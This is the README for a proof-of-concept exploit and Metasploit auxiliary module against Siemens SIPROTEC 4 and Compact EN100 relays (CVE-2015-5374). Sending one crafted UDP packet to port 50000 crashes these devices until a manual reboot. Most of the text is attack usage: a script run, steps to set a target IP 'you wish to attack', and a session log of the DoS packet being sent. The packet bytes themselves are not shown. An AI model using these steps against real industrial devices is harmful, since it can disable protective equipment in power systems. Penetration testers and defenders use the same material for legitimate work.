CVE-2015-5374 Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service
====================================
This code sends a specially crafted packet to Port 50000/UDP could cause a denial of service of the affected device. A manual reboot is required to return the device to service. CVE-2015-5374 and a CVSS v2 base score of 7.8 have been assigned to this vulnerability.
```
can@exploit:~/siprotec_dos_poc$ python Siemens_SIPROTEC_DoS.py <target>
CVE-2015-5374 Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service
Sending packet to <target> ...
Done, say goodbye!
```
## Metasploit Module

This module sends a specially crafted packet to Port 50000/UDP could cause a denial of service of the affected device. A manual reboot is required to return the device to service. 
## Verification Steps

  1. Do: ```use auxiliary/dos/scada/siemens_siprotec4```
  2. Do: ```set RHOST [Target IP]```, replacing ```[Target IP]``` with the IP address you wish to attack.
  3. Do: ```run```
  4. If the Siemens SIPROTEC 4 or Compact device has one of the vulnerable versions, it will immediately crash.

## Options

  ```set RHOST [Target IP]```, ```set RPORT [Target Port (Default 50000)]```.

## Scenarios

  ```
msf auxiliary(siemens_siprotec4) > info

       Name: Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service 
     Module: auxiliary/dos/scada/siemens_siprotec4
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  M. Can Kurnaz

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  50000            yes       The target port (UDP)

Description:
  This module sends a specially crafted packet to port 50000/UDP 
  causing a denial of service of the affected (Siemens SIPROTEC 4 and 
  SIPROTEC Compact) devices. A manual reboot is required to return the 
  device to service. CVE-2015-5374 and a CVSS v2 base score of 7.8 
  have been assigned to this vulnerability.

References:
  https://www.exploit-db.com/exploits/44103/
  https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01

msf auxiliary(siemens_siprotec4) > show options 

Module options (auxiliary/dos/scada/siemens_siprotec4):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  50000            yes       The target port (UDP)

msf auxiliary(siemens_siprotec4) > set rhost 192.168.1.61
rhost => 192.168.1.61
msf auxiliary(siemens_siprotec4) > run

[*] Sending DoS packet ... 
[*] Auxiliary module execution completed
msf auxiliary(siemens_siprotec4) > 
```
